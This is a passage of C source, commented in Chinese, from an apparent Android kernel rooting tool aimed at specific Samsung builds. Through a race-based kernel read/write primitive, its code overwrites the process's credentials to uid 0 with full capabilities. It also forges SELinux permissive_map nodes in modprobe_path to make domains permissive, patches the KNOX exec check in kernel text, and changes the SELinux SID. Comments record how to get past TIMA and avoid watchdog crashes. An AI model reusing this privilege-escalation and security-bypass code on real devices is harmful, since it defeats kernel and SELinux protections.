		unsigned int o = (w >> 21) & 15, s = (w >> 20) & 1;
		unsigned int rn = (w >> 16) & 15, rd = (w >> 12) & 15;
		unsigned int rm = w & 15, st = (w >> 5) & 3, si = (w >> 7) & 31;
		char shf[24];

		/* bit4=1 是寄存器移位 / 乘法 / 半字传输 / BX，交给 .word，不猜 */
		if (w & 0x10u) {
			printf(".word 0x%08x", w);
			return;
		}
		shf[0] = 0;
		if (si)
			snprintf(shf, sizeof(shf), ", %s #%u", shn[st], si);
		else if (st == 3)
			snprintf(shf, sizeof(shf), ", rrx");

		if (o == 13 || o == 15)		/* mov / mvn */
			printf("%s%s%s %s, %s%s", op[o], c, s ? "s" : "",
			       kt_reg(rd), kt_reg(rm), shf);
		else if (o >= 8 && o <= 11)	/* tst/teq/cmp/cmn */
			printf("%s%s %s, %s%s", op[o], c, kt_reg(rn), kt_reg(rm), shf);
		else
			printf("%s%s%s %s, %s, %s%s", op[o], c, s ? "s" : "",
			       kt_reg(rd), kt_reg(rn), kt_reg(rm), shf);
		return;
	}
	/* LDR/STR 立即数（含 pc 相对，直接算出目标地址） */
	if ((w & 0x0c000000u) == 0x04000000u) {
		unsigned int p = (w >> 24) & 1, u = (w >> 23) & 1;
		unsigned int b = (w >> 22) & 1, l = (w >> 20) & 1;
		unsigned int rn = (w >> 16) & 15, rd = (w >> 12) & 15;
		unsigned long imm = w & 0xfffu;
		unsigned long base;

		printf("%s%s%s %s, [%s", l ? "ldr" : "str", b ? "b" : "", c,
		       kt_reg(rd), kt_reg(rn));
		if (p) {
			base = (rn == 15) ? (addr + 8) : 0;
			printf(", %s0x%lx]", u ? "#" : "#-", imm);
			if (rn == 15)
				printf("  ; =0x%08lx", u ? base + imm : base - imm);
		} else {
			printf("], %s0x%lx", u ? "#" : "#-", imm);
		}
		return;
	}
	/* PUSH / POP */
	if ((w & 0x0fff0000u) == 0x092d0000u) {
		char rl[96];

		kt_reglist(w & 0xffff, rl, sizeof(rl));
		printf("push%s {%s}", c, rl);
		return;
	}
	if ((w & 0x0fff0000u) == 0x08bd0000u) {
		char rl[96];

		kt_reglist(w & 0xffff, rl, sizeof(rl));
		printf("pop%s {%s}", c, rl);
		return;
	}
	/* LDM / STM */
	if ((w & 0x0e000000u) == 0x08000000u) {
		unsigned int p = (w >> 24) & 1, u = (w >> 23) & 1;
		unsigned int l = (w >> 20) & 1, rn = (w >> 16) & 15;
		char rl[96];

		kt_reglist(w & 0xffff, rl, sizeof(rl));
		printf("%s%s%s %s%s, {%s}", l ? "ldm" : "stm", u ? "i" : "d",
		       p ? "b" : "a", kt_reg(rn), (w & (1u << 21)) ? "!" : "", rl);
		return;
	}
	if (w == 0xe320f000u) {
		printf("nop");
		return;
	}
	printf(".word 0x%08x", w);
}

/* 读 n 条指令（一次读，不逐条竞态），逐条反汇编 */
static int kt_cmd_dis(unsigned long addr, int n)
{
	unsigned char *buf;
	int k, bytes;

	if (n <= 0)
		n = 16;
	if (n > 64)
		n = 64;
	bytes = n * 4;
	buf = malloc(bytes);
	if (!buf)
		return 1;
	if (kread_buf(addr, buf, bytes) != 0) {
		free(buf);
		printf("read fail @0x%08lx\n", addr);
		return 2;
	}
	for (k = 0; k < n; k++) {
		uint32_t w = kt_rd32(buf + k * 4);

		printf("%08lx  %08x  ", addr + k * 4, w);
		kt_dis_one(addr + k * 4, w);
		printf("\n");
	}
	free(buf);
	return 0;
}

/* ---------------- P4.84：指针搜索 ---------------- */

#define KT_PHITS 32

struct p_hit {
	unsigned long addr;	/* 这个字在哪 */
	unsigned long val;	/* 字里的值 */
	unsigned long base;	/* 值落在哪个符号里（0 = 没查到） */
	char type;
	char name[136];
};

/*
 * 给每个命中的 **值** 找符号。
 * 为什么要标值而不是标地址：命中地址一般在 slab（堆）里，符号表里没有；
 * 值往往指向内核镜像里的对象（init_cred、init_task…），一标就懂。
 * 一遍扫表同时更新所有命中，避免 63k × n 次重复解析。
 */
static void kt_annotate(struct p_hit *h, int n)
{
	const char *file = kt_sym_pick_file();
	struct sym_hit s;
	char line[512];
	FILE *f;
	int i;

	if (!n || !(file = kt_sym_pick_file()))
		return;
	f = fopen(file, "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		if (kt_sym_parse_line(line, &s) != 0)
			continue;
		for (i = 0; i < n; i++) {
			if (s.addr > h[i].val)
				continue;
			if (s.addr > h[i].base ||
			    (s.addr == h[i].base && isupper((unsigned char)s.type) &&
			     !isupper((unsigned char)h[i].type))) {
				h[i].base = s.addr;
				h[i].type = s.type;
				snprintf(h[i].name, sizeof(h[i].name), "%s", s.name);
			}
		}
	}
	fclose(f);
}


/*
 * 所有 build 相关地址改由 targets.h 的适配表提供（P4.29）。
 * g_t 在 main() 里按「机型 + 内核 version 串」选定；选不到就拒绝执行任何
 * 地址类操作（fail closed），绝不按机型猜地址。
 */
static const struct ktool_target *g_t;

#define PERM_BASE     (g_t->modprobe_path)
#define PERM_MAP      (g_t->permissive_map)
#define AVC_SLOTS     (g_t->avc_slots)
#define EXEC_BR       (g_t->exec_br)
#define EXEC_BR_ORIG  (g_t->exec_br_orig)
#define EXEC_BR_PATCH (g_t->exec_br_patch)

/* [B] 内核配置相关偏移（同 defconfig 通用） */
#define OFF_TASKS         (g_t->off_task_tasks)
#define OFF_TASK_REALCRED (g_t->off_task_real_cred)
#define OFF_TASK_COMM     (g_t->off_task_comm)
#define OFF_CRED_UID      (g_t->off_cred_uid)
#define OFF_CRED_CAPS     (g_t->off_cred_caps)
/* 3.4 的 struct cred：+0x58 是 security（task_security_struct*），
 * 里面 +0x0=osid、+0x4=sid。实测 walk init_task 0x2f8 0x58 得到 1/1。 */
#define OFF_CRED_SECURITY 0x58
#define OFF_TSEC_SID      0x4
#define NNODES      8
#define NODE_SZ     32
#define NODE_BITS   192

/*
 * 后端自检：读 init_task 的头 8 字节。
 * 选这个地址是因为它一定可读、且与机型无关（g_t->init_task 本身来自适配表）。
 * 只读不写，跑一百次也不会改变系统状态。
 */
static int krw_probe(void)
{
	unsigned char b[8];

	if (!g_t)
		return -1;
	return iovyroot_read(g_t->init_task, b, 8);
}

/*
 * P4.50：竞态不在状态时，find_self() 会把 6×400×2 次 kread 全部跑完，
 * 每次 kread 又各有 300 次 try —— 一次失败的 do_root 要卡好几分钟，
 * 期间 spinner 线程持续占 CPU，还会在内核态留下杀不掉的忙等线程，
 * 反过来让后续竞态更难赢（loadavg 自我放大，实测涨到 7+ 且不回落）。
 * 所以给一个总时长预算：正常命中时 find_self 只需几次 kread 就返回，
 * 预算宽裕；一旦超时就快速失败，交给外面重打，不再拖住整个系统。
 */
static time_t g_find_deadline;

/*
 * P4.85：会话内缓存自己的 task_struct。
 * 同一进程的 task 地址在生命周期内不变，重扫 400 个 task 纯属浪费竞态预算。
 * 命中后先回读 comm 验证，comm 对就复用；对不上（换进程/被 rename）再重扫。
 */
static unsigned long g_self_task;
static int g_self_valid;

/*
 * P4.86-B5：promote 前的 cred 快照，供 unroot 还原。
 *
 * 只存 cred+4 起的 72 字节（uid/gid×8 + securebits + 四组 cap，到 cap_bset 结束）。
 * **故意不含 cred+0 的 usage**：那是引用计数，是运行时值，
 * 把旧值写回去会让 refcount 错乱（少计/多计都可能导致 UAF 或泄漏）。
 *
 * 作用域就是本进程：改的是自己的 cred，进程一退内核就把这个 cred 释放了，
 * 所以不需要跨会话持久化，也不该在别的会话里"还原"一个可能已被复用的地址。
 */
#define KT_CRED_SNAP 0x48
struct cred_snap {
	int valid;
	unsigned long task, cred, rcred;
	unsigned char credb[KT_CRED_SNAP];
	unsigned char rcredb[KT_CRED_SNAP];
};
static struct cred_snap g_cs;

static unsigned long find_self(void)
{
	unsigned char b[64];
	unsigned long ih = g_t->init_task, p = 0;
	uint32_t next;
	int i, attempt;

	if (g_self_valid && g_self_task &&
	    kread(g_self_task + (OFF_TASK_COMM - 4), b, 64) == 0 &&
	    !strncmp((char *)(b + 4), "ktool", 5))
		return g_self_task;
	g_self_valid = 0;

	for (attempt = 0; attempt < 6 && !p; attempt++) {
		if (g_find_deadline && time(NULL) > g_find_deadline) {
			printf("find_self: deadline hit (attempt %d)\n", attempt);
			break;
		}
		if (kread(ih + (OFF_TASKS - 0x10), b, 64) != 0) continue;
		next = *(uint32_t *)(b + 0x14);      /* prev：从尾部反向走 */
		for (i = 0; i < 400 && next; i++) {
			unsigned long q = next - OFF_TASKS;
			if (kread(q + (OFF_TASK_COMM - 4), b, 64) == 0 &&
			    !strncmp((char *)(b + 4), "ktool", 5)) { p = q; break; }
			if (kread(q + (OFF_TASKS - 0x10), b, 64) != 0) break;
			next = *(uint32_t *)(b + 0x14);
			if (next == ih + OFF_TASKS) break;
		}
	}
	if (p) {
		g_self_task = p;
		g_self_valid = 1;
	}
	return p;
}

/*
 * P4.86-B4：带快照回滚的整段写。
 * 与 kwrite_txn 的区别：快照由调用方提供（已经读好了），不用再读一遍。
 * bak 为 NULL 表示没有快照，失败时只能如实报告。
 */
/*
 * P4.88：用**内核自己的视角**判断提权是否生效。
 * 为什么不用读原语读回：实测写完立刻读会拿到错误数据
 * （wtest 完整模式里读回说 euid=0，同一时刻 geteuid()=2000），
 * 读回校验会把结果整个判反。getuid/capget 走的是内核的 current_cred()，
 * 是唯一可信的地面真相。
 */
static int kt_caps_full(void)
{
	struct cap_hdr h = { 0x20080522, 0 };
	struct cap_data d[2];

	memset(d, 0, sizeof(d));
	if (syscall(__NR_capget, &h, d) != 0)
		return 0;
	return d[0].eff == 0xffffffffU && d[0].perm == 0xffffffffU &&
	       d[0].inh == 0xffffffffU;
}

/*
 * 按 8 字节块写整段。
 *
 * P4.88 实测（wtest 逐偏移 + 完整模式对比）：
 *   - 单独写任意偏移的 8 字节：9/9 全落地；
 *   - 但在**同一进程里连着写**多块时，第一块之后开始系统性失败
 *     （uid/gid/eff 落地，euid/inh/perm/bset 每次都不落地）；
 *   - 只要每块之间穿插一次读（kwrite_verify_buf 的内部读回），
 *     完整 9 块就能 8/10 全部落地。
 * 结论：写完必须接一次读来"复位"管道状态，drain() 不够。
 * 所以这里仍然用 kwrite_verify_buf（写+读回+比对），
 * 但**不轻信它的返回值**——读回本身有概率拿到污染数据（10 次里约 2 次误判），
 * 真正的判定交给调用方的内核视角（getuid/capget）。
 */
static int kt_write_rb(unsigned long addr, const void *data, int len)
{
	const unsigned char *p = data;
	int off, bad = 0;

	for (off = 0; off < len; off += 8) {
		if (kwrite_verify_buf(addr + off, p + off, 8) != 0)
			bad++;
	}
	if (bad)
		printf("  （%d/%d 块的读回校验没过，交给内核视角判定）\n",
		       bad, len / 8);
	return 0;
}

/*
 * 快照(cred+4 起 72 字节) 与当前进程的真实身份是否一致。
 * 布局：+0x00 uid +0x04 gid +0x10 euid +0x14 egid
 *       +0x24 cap_inheritable +0x2c cap_permitted +0x34 cap_effective
 * capget 每个集合只回一个 u32，这里取每个 8 字节集合的低字比对
 * （shell 的 caps 是 0、满 caps 是 ffffffff，两种都能正确判定）。
 */
static int kt_cred_matches(const unsigned char *s)
{
	struct cap_hdr h = { 0x20080522, 0 };
	struct cap_data d[2];

	if ((uint32_t)getuid() != kt_rd32(s + 0x00)) return 0;
	if ((uint32_t)getgid() != kt_rd32(s + 0x04)) return 0;
	if ((uint32_t)geteuid() != kt_rd32(s + 0x10)) return 0;
	if ((uint32_t)getegid() != kt_rd32(s + 0x14)) return 0;
	memset(d, 0, sizeof(d));
	if (syscall(__NR_capget, &h, d) != 0) return 0;
	if (d[0].eff != kt_rd32(s + 0x34)) return 0;
	if (d[0].perm != kt_rd32(s + 0x2c)) return 0;
	if (d[0].inh != kt_rd32(s + 0x24)) return 0;
	return 1;
}

static int do_root_inner(void)
{
	unsigned char b[64];
	unsigned long p, rcred, cred;
	int i;

	g_find_deadline = time(NULL) + 12;	/* find_self 单独收一层，便于定位 */
	p = find_self();
	g_find_deadline = 0;
	if (!p) { printf("task not found\n"); return -1; }
	if (kread(p + OFF_TASK_REALCRED, b, 64) != 0) { printf("cred read fail\n"); return -1; }
	rcred = *(uint32_t *)(b);
	cred  = *(uint32_t *)(b + 4);
	if (kread(cred, b, 64) != 0) { printf("cred deref fail\n"); return -1; }
	{
		/*
		 * 原来要求 8 个 uid/gid 字段全等于 0x7d0（adb shell）。
		 * 但 sec-sh 开机脚本本身是 uid 0，会直接失败（P4.11 已踩过）。
		 * 改成：首个字段必须是 0 或 0x7d0，其余 7 个必须与它一致。
		 */
		uint32_t expect = *(uint32_t *)(b + 4);

		if (expect != 0x7d0 && expect != 0) {
			printf("cred check FAIL: unexpected uid %x\n", expect);
			return -1;
		}
		for (i = 0; i < 8; i++) {
			uint32_t v = *(uint32_t *)(b + 4 + i * 4);
			if (v != expect) {
				printf("cred check FAIL +%x=%x (expect %x)\n", 4 + i*4, v, expect);
				return -1;
			}
		}
	}
	printf("task=%08lx cred=%08lx\n", p, cred);

	/* B5：动手前先留后路。快照失败不阻止提权，但要明确说"这次回不去了"。 */
	if (kread_buf(cred + 4, g_cs.credb, KT_CRED_SNAP) == 0) {
		g_cs.task = p;
		g_cs.cred = cred;
		g_cs.rcred = (rcred && rcred != cred) ? rcred : 0;
		if (g_cs.rcred &&
		    kread_buf(g_cs.rcred + 4, g_cs.rcredb, KT_CRED_SNAP) != 0)
			g_cs.rcred = 0;
		g_cs.valid = 1;
	} else {
		g_cs.valid = 0;
		printf("! cred 快照失败，本次 promote 之后无法 unroot\n");
	}

	/*
	 * P4.86-B4：一次写完 + 失败回滚。
	 * 原来是 6 次独立写（4 组 cap + 8 个 uid + real_cred 再来一遍），
	 * 中途任一步失败就停在"caps 全满但 uid 还没改"的半改状态。
	 * 现在按 72 字节（cred+4..+0x4B）整体写：当前值 + uid 清零 + caps 全满。
	 *
	 * P4.88 起不再做"逐块读回校验"：实测读回不可信（见 kt_caps_full 注释），
	 * 改成写完用内核视角确认，不确认就整段重写，仍不确认才回滚。
	 */
	{
		unsigned char want[KT_CRED_SNAP];
		int attempt;

		for (attempt = 0; attempt < 6; attempt++) {
			if (kread_buf(cred + 4, want, KT_CRED_SNAP) != 0) {
				printf("cred 重读失败\n");
				return -1;
			}
			memset(want, 0, 32);				/* uid/gid×8 */
			memset(want + (OFF_CRED_CAPS - 4), 0xff, 32);	/* 四组 cap 全满 */
			kt_write_rb(cred + 4, want, KT_CRED_SNAP);
			printf("  #%d 写入后: uid=%d euid=%d gid=%d caps_full=%d\n",
			       attempt + 1, (int)getuid(), (int)geteuid(),
			       (int)getgid(), kt_caps_full());
			if (getuid() == 0 && geteuid() == 0 && kt_caps_full())
				break;
			printf("  #%d 次写入后 uid/caps 未全部生效，重写\n", attempt + 1);
		}
		if (getuid() != 0 || geteuid() != 0 || !kt_caps_full()) {
			printf("! %d 次写入仍未生效，按快照回滚\n", attempt);
			if (g_cs.valid) {
				kt_write_rb(cred + 4, g_cs.credb, KT_CRED_SNAP);
				printf("  已回滚到 promote 前状态\n");
			}
			return -1;
		}
		show_caps("caps:");

		if (g_cs.rcred) {
			uint32_t ru;

			if (kread_buf(g_cs.rcred + 4, want, KT_CRED_SNAP) != 0) {
				printf("! real_cred 读失败，跳过\n");
			} else {
				ru = *(uint32_t *)want;
				if (ru != 0x7d0 && ru != 0) {
					printf("! real_cred uid=%x 不像自己的，跳过\n", ru);
				} else {
					memset(want, 0, 32);
					memset(want + (OFF_CRED_CAPS - 4), 0xff, 32);
					kt_write_rb(g_cs.rcred + 4, want, KT_CRED_SNAP);
					printf("real_cred patched\n");
				}
			}
		}
	}
	printf("uid now: %d/%d/%d\n", (int)getuid(), (int)geteuid(), (int)getgid());
	show_caps("caps after uid:");
	return 0;
}

/*
 * P4.50：do_root 的包装，只负责给整段设 30 秒硬预算并在退出时清除，
 * 保证所有 return 路径都不残留 g_io_deadline（do_root_inner 有多条失败
 * 分支，逐条清容易漏）。竞态正常时 do_root_inner 几秒内就返回，预算宽裕。
 */
static int do_root(void)
{
	time_t save = g_io_deadline;
	int r;

	g_io_deadline = time(NULL) + 15;	/* < watchdog 20s 阈值 */
	r = do_root_inner();
	g_io_deadline = save;			/* 别把用户 -t 设的预算冲掉 */
	return r;
}

/*
 * P4.49：让 /dev/ktool 的 uid0 门禁恢复本意。
 *
 * 模块的 ktool_is_uid0() 用内核内联 current_uid()，而模块是按源码树的
 * task_struct 布局编译的（cred 在 +0x2EC）；设备内核实际 cred 在 +0x2FC
 * （P4.25/P4.48 实测钉死）。于是 current_uid() 每次读到野指针、恒定返回
 * 垃圾（实测 -816291736 / -428549080 等随机值），门禁把真正的 uid0 进程
 * 也一并拒掉 —— 这就是 sem_canary 连续 8 次 EACCES 的根因。
 * 设备内核 struct cred 布局与源码树一致：cred+4 = uid（system_server
 * uid 1000 实测 cred+4 = 0x3e8 ✓），所以问题只在 task_struct 偏移。
 *
 * 安全性（源码 + 实测双重确认）：
 *   task+0x2E8/0x2EC = struct list_head cpu_timers[N] 的 next/prev。
 *   无 POSIX CPU 定时器的进程这三个链表全是空链自指（init_task 与
 *   system_server 实测一致）。
 *   run_posix_cpu_timers() 的 fastpath_timer_check() 只看
 *   cputime_expires 和 sig->cputimer.running，完全不碰 cpu_timers[]；
 *   check_thread_timers() 只在 fastpath 命中后才走。posix_cpu_timers_exit()
 *   的 cleanup 用 list_for_each_entry_safe，从 next 起步，prev 不参与。
 *   ⇒ 只改 prev（+0x2EC）、让 next（+0x2E8）保持自指，list_empty() 仍为真，
 *     没有任何内核路径会遍历我们写入的值。
 */

/* policydb.permissive_map 为空（node=NULL,highbit=0），往 modprobe_path 写一串
 * 全 1 的 ebitmap_node，再把 map 头指过去 → 所有 type 变成 permissive。
 * ALWAYS_ENFORCE 只去掉 selinux_enforcing 判断，avc_denied 仍认 AVD_FLAGS_PERMISSIVE。 */

/* 用「重载原厂策略」来失效 AVC 缓存：
 * 内核走 security_load_policy() -> avc_ss_reset()，全程持锁，不会破坏哈希链。
 * 副作用：policydb 被重置，permissive_map 自动变空 —— 正是我们要的状态。
 * 绝对不要像旧版那样直接 memset avc_cache.slots：那是无锁写活哈希表，
 * 与并发的 avc_insert 竞争会造出环链，avc_search_node 死循环 -> 看门狗重启。 */
/*
 * P4.89 负面结论：不要用「重载 /sepolicy」来复位 AVC。
 *
 * 原本这里有一个 reload_stock_policy()（打开 /sepolicy，写
 * /sys/fs/selinux/load），想把它当作「模块未加载时 flush 的兜底」。
 * 真机实测：写进去的那一刻，Samsung 的 security_load_policy 钩子会触发
 * TIMA 对内核做完整性度量，dmesg 打出：
 *
 *   tima measure_verify_kernel: KERNEL VERIFICATION FAILED
 *   tima generate_response_string: Kernel verification failure
 *   Tl_TIMA_PKM: ret = 0xffffffff = -1
 *
 * 因为 exec patch 改过 .text，度量必然失败；trustlet 返回 -1 后内核侧的
 * write 永远不返回，进程卡死在内核态 D（不可中断），SIGKILL 也杀不掉，
 * 还会永久占住 selinuxfs 的 sel_mutex。
 *
 * 结论：这台机器上**唯一**可用的 AVC 复位通路是模块的 avcflush
 * （/dev/ktool）。所以顺序必须反过来：先 flush，再 rmmod；模块一卸就
 * 再也清不了缓存，只能重启。
 */

/*
 * 只把 init_shell(986) 标为 permissive，其余 1342 个 type 保持 enforcing。
 * 节点链结构和 highbit(1536) 都不动，只清掉 maps 里的位。
 * 需要的最小集合只有一个：sec-sh 本身就是 init_shell 域，
 * 且 init_shell 有 CAP_SYS_MODULE + system_file:file {execute,execute_no_trans}，
 * 所以模块加载不需要 kernel 域，也不需要 exec patch。
 */
static unsigned int g_perm_bit;		/* 0 = 用表里的值 */

static int do_permissive_min(void)
{
	unsigned char buf[256], rb[256];
	unsigned int hdr[2];
	unsigned int bits[1];
	int i;

	bits[0] = g_perm_bit ? g_perm_bit : g_t->perm_bit;

	memset(buf, 0, sizeof(buf));
	for (i = 0; i < NNODES; i++) {
		unsigned char *n = buf + i * NODE_SZ;
		unsigned int nx = (i == NNODES - 1) ? 0
				: (unsigned int)(PERM_BASE + (i + 1) * NODE_SZ);
		unsigned int sb = i * NODE_BITS;

		memcpy(n, &nx, 4);
		memset(n + 4, 0, 24);      /* 6 个 u32 maps，先全清 */
		memcpy(n + 28, &sb, 4);
	}

	for (i = 0; i < (int)(sizeof(bits) / sizeof(bits[0])); i++) {
		unsigned int b = bits[i], nidx, off, widx, wbit, w;
		unsigned char *n;

		if (b >= (unsigned int)(NNODES * NODE_BITS))
			continue;
		nidx = b / NODE_BITS;
		off  = b % NODE_BITS;
		widx = off / 32;
		wbit = off % 32;
		n = buf + nidx * NODE_SZ;
		memcpy(&w, n + 4 + widx * 4, 4);
		w |= (1U << wbit);
		memcpy(n + 4 + widx * 4, &w, 4);
	}

	if (kwrite_verify(PERM_BASE, buf, 256) != 0) { printf("write nodes fail\n"); return -1; }

	hdr[0] = PERM_BASE;
	hdr[1] = NNODES * NODE_BITS;
	if (kwrite_verify(PERM_MAP, hdr, 8) != 0) { printf("write map fail\n"); return -1; }
	if (kread(PERM_MAP, rb, 8) != 0 || memcmp(rb, hdr, 8)) {
		printf("map verify fail\n"); return -1;
	}
	printf("permissive_map: node=%08x highbit=%u bits=[%u] (min)%s\n",
	       hdr[0], hdr[1], bits[0],
	       g_perm_bit ? " [override]" : "");
	printf("note: 已有缓存的拒绝不会失效（重启可清）；新三元组即时生效\n");
	return 0;
}

static int do_permissive(void)
{
	unsigned char buf[256], rb[256];
	unsigned int hdr[2];
	int i, j;

	memset(buf, 0, sizeof(buf));
	for (i = 0; i < NNODES; i++) {
		unsigned char *n = buf + i * NODE_SZ;
		unsigned int nx = (i == NNODES - 1) ? 0
				: (unsigned int)(PERM_BASE + (i + 1) * NODE_SZ);
		unsigned int sb = i * NODE_BITS;

		memcpy(n, &nx, 4);
		for (j = 0; j < 6; j++) {
			unsigned int f = 0xffffffffU;
			memcpy(n + 4 + j * 4, &f, 4);
		}
		memcpy(n + 28, &sb, 4);
	}
	if (kwrite_verify(PERM_BASE, buf, 256) != 0) { printf("write nodes fail\n"); return -1; }

	hdr[0] = PERM_BASE;
	hdr[1] = NNODES * NODE_BITS;
	if (kwrite_verify(PERM_MAP, hdr, 8) != 0) { printf("write map fail\n"); return -1; }
	if (kread(PERM_MAP, rb, 8) != 0 || memcmp(rb, hdr, 8)) {
		printf("map verify fail\n"); return -1;
	}
	printf("permissive_map: node=%08x highbit=%u\n", hdr[0], hdr[1]);
	printf("note: 已有缓存的拒绝不会失效（重启可清）；新三元组即时生效\n");
	return 0;
}

/* Samsung 在 sys_execve 入口加的限制：
 *   c0012164: beq 0xc0012174  (cred 六个 id 任一为 0 则进入 KNOX 检查块)
 * 检查块里 sec_check_execpath(mm,"/data/") 命中就 printk 并 return -EACCES。
 * 改成无条件 b 0xc0012288，直接进 do_execve。 */
/* 通过模块换 SELinux 域（需要 uid0 才过门禁，调用前必须先 do_root）
 * 模块没加载时返回非 0，调用方自行兜底。 */
static int do_ctx(const char *ctx)
{
	int fd, n;
	ssize_t w;

	fd = open("/dev/ktool", O_WRONLY);
	if (fd < 0)
		return -1;
	w = write(fd, ctx, strlen(ctx));
	n = (int)w;
	close(fd);
	if (w != (ssize_t)strlen(ctx)) {
		printf("ctx write failed (%d)\n", n);
		return -1;
	}
	return 0;
}

static int do_patch_exec(int on)
{
	unsigned char b[8];
	int i;
	uint32_t cur, want = on ? EXEC_BR_PATCH : EXEC_BR_ORIG;
	uint32_t pair[2];

	for (i = 0; i < 3; i++)
		if (kread(EXEC_BR, b, 8) == 0)
			break;
	if (i == 3) { printf("read branch fail\n"); return -1; }
	cur = *(uint32_t *)b;
	if (cur == want) { printf("exec patch already %s\n", on ? "on" : "off"); return 0; }
	if (cur != EXEC_BR_ORIG && cur != EXEC_BR_PATCH) {
		printf("unexpected insn %08x @%08lx, refuse\n", cur, EXEC_BR);
		return -1;
	}
	pair[0] = want;
	pair[1] = *(uint32_t *)(b + 4);
	if (kwrite_verify(EXEC_BR, pair, 8) != 0) { printf("patch write fail\n"); return -1; }
	if (kread(EXEC_BR, b, 8) != 0 || *(uint32_t *)b != want) {
		printf("patch verify fail\n"); return -1;
	}
	printf("exec patch %s (%08x -> %08x)\n",
	       on ? "applied" : "reverted", cur, want);
	return 0;
}


/* 把 permissive_map 恢复成空、modprobe_path 还原、AVC 清桶，
 * 让系统回到正常的 enforcing 语义（不动 selinux_enforcing，避免 TIMA 告警）。 */
static int do_unperm(void)
{
	unsigned int hdr[2] = {0, 0};
	unsigned char mp[256];

	/* 只把 permissive_map 清零，不动 avc_cache。
	 * 旧缓存里带 PERMISSIVE 标志的条目仍然有效——所以本函数**单独调用
	 * 不构成"恢复强制"**，必须由调用方（enforce）再走一次 avcflush。
	 * 为什么不用"无锁写活哈希表"：会造成环链，avc_search_node 死循环，
	 * 看门狗重启（已实测）。 */
	if (kwrite_verify(PERM_MAP, hdr, 8) != 0) { printf("restore permissive_map fail\n"); return -1; }

	memset(mp, 0, sizeof(mp));
	strcpy((char *)mp, "/sbin/modprobe");
	if (kwrite_verify(PERM_BASE, mp, 256) != 0) { printf("restore modprobe_path fail\n"); return -1; }

	printf("permissive_map cleared, modprobe_path restored\n");
	return 0;
}




/* ---------------- 目标识别（P4.29） ----------------
 * 不依赖 bionic：直接读 build.prop 和 /proc/version。
 */
static int kt_prop(const char *name, char *out, size_t outsz)
{
	static const char *files[] = { "/system/build.prop", "/vendor/build.prop",
				       "/default.prop", NULL };
	int i;

	out[0] = 0;
	for (i = 0; files[i]; i++) {
		FILE *f = fopen(files[i], "r");
		char line[512];
		size_t n = strlen(name);

		if (!f)
			continue;
		while (fgets(line, sizeof(line), f)) {
			if (strncmp(line, name, n) || line[n] != '=')
				continue;
			{
				char *v = line + n + 1;
				char *e = v;

				while (*e && *e != '\n' && *e != '\r')
					e++;
				*e = 0;
				snprintf(out, outsz, "%s", v);
			}
			fclose(f);
			return 0;
		}
		fclose(f);
	}
	return -1;
}

/* /proc/version 里 "Linux version 3.4.5-6264821 ..." 的第二段 */
static int kt_kernel_ver(char *out, size_t outsz)
{
	FILE *f = fopen("/proc/version", "r");
	char buf[512], *p;
	size_t i = 0;

	out[0] = 0;
	if (!f)
		return -1;
	if (!fgets(buf, sizeof(buf), f)) {
		fclose(f);
		return -1;
	}
	fclose(f);
	p = strstr(buf, "Linux version ");
	if (!p)
		return -1;
	p += 14;
	while (p[i] && p[i] != ' ' && p[i] != '\n' && i + 1 < outsz) {
		out[i] = p[i];
		i++;
	}
	out[i] = 0;
	return i ? 0 : -1;
}

static void kt_list_targets(const char *dev, const char *ver)
{
	unsigned int i;

	printf("device=%s kernel=%s\n", dev && dev[0] ? dev : "?", ver && ver[0] ? ver : "?");
	printf("supported targets:\n");
	for (i = 0; i < KT_NTARGETS; i++) {
		const struct ktool_target *t = &ktool_targets[i];

		printf("  %-10s device=%-12s kernel=%-18s %s\n", t->model,
		       t->device, t->kernel, t->verified ? "[verified]" : "[未验证]");
		if (t->build && t->build[0])
			printf("             build=%s\n", t->build);
	}
	printf("加目标见 P4.29_机型build适配表.md（只需推 6 个地址，逻辑不动）\n");
}

static const struct ktool_target *kt_select_target(const char *dev, const char *ver)
{
	const struct ktool_target *t = ktool_find_target(dev, ver);

	if (!t)
		kt_list_targets(dev, ver);
	return t;
}

static int kt_cmd_target(void)
{
	unsigned int i;

	if (!g_t) {
		kt_list_targets("", "");
		printf("=> 没有匹配项，所有地址类命令都会被拒绝\n");
		return 2;
	}
	printf("model : %s\n", g_t->model);
	printf("device: %s\n", g_t->device);
	printf("build : %s\n", g_t->build ? g_t->build : "-");
	printf("kernel: %s\n", g_t->kernel);
	printf("sepf  : %s\n", g_t->sepf ? g_t->sepf : "-");
	printf("[A] build-specific:\n");
	printf("  init_task        = 0x%08lx\n", g_t->init_task);
	printf("  modprobe_path    = 0x%08lx  (假 ebitmap 节点暂存区)\n", g_t->modprobe_path);
	printf("  permissive_map   = 0x%08lx\n", g_t->permissive_map);
	printf("  avc_slots        = 0x%08lx\n", g_t->avc_slots);
	printf("  exec_br          = 0x%08lx  (orig %08x -> patch %08x)\n",
	       g_t->exec_br, g_t->exec_br_orig, g_t->exec_br_patch);
	printf("  lkmauth_bootmode = 0x%08lx\n", g_t->lkmauth_bootmode);
	printf("[B] config-specific:\n");
	printf("  task.tasks=%x real_cred=%x cred=%x comm=%x\n", g_t->off_task_tasks,
	       g_t->off_task_real_cred, g_t->off_task_cred, g_t->off_task_comm);
	printf("  cred.uid=%x caps=%x security=%x\n", g_t->off_cred_uid,
	       g_t->off_cred_caps, g_t->off_cred_security);
	printf("verified: %s | %s\n", g_t->verified ? "yes" : "NO",
	       g_t->note ? g_t->note : "");
	(void)i;
	return 0;
}

/* 定义在 main 之后：会话模式与一次性模式共用同一套命令分发 */
/*
 * setsid <sid|init_shell> [cmd...]
 *
 * 没有模块（/dev/ktool 不在）时，没法用 ctx 切域。这里直接改内核里的
 * cred->security->sid：selinux 的 current_sid() 就是从这儿取的。
 * 典型用途：boot 脚本坏掉导致模块没加载、AVC 缓存里又留着 shell 域的
 * deny（permissive 也不重算）时，用 init_shell 这个**新 ssid** 去 mount，
 * 首次判定会重新计算、permissive 立刻生效。
 *
 * 只改 sid，不动 uid/caps 规则：默认先 do_root() 再改。
 */
static int ktool_cmd_setsid(int argc, char **argv)
{
	unsigned long p;
	unsigned char b[16];
	uint32_t cred, sec, sid;

	if (argc < 3) {
		fprintf(stderr, "usage: setsid <sid|init_shell> <cmd...>\n");
		return 1;
	}
	fprintf(stderr, "setsid: enter\n");
	if (do_root() != 0) {
		fprintf(stderr, "setsid: do_root failed\n");
		return 3;
	}
	fprintf(stderr, "setsid: root ok\n");
	p = find_self();
	fprintf(stderr, "setsid: self=%lx\n", p);
	if (!p) {
		fprintf(stderr, "setsid: find_self failed\n");
		return 2;
